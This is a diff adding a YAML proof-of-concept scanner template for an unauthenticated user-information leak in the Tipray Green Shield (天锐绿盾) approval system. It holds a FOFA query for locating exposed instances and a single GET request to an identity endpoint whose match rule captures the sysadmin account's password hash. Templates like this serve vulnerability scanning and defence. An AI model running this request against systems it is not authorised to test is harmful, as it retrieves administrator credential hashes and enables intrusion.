@@ -1,0 +1,15 @@
+id: poc-yaml-tipray-gsas-user-info-leak
+info:
+  name: 天锐绿盾审批系统 user 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: GET
+  path: /trwfe/ws/identity/user/sysadmin
+  expression: status_code == 200 && contains(body,"\"id\":\"sysadmin\"") && matches(body,"\"password\":\"([0-9a-z]{32})\"")
+    && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
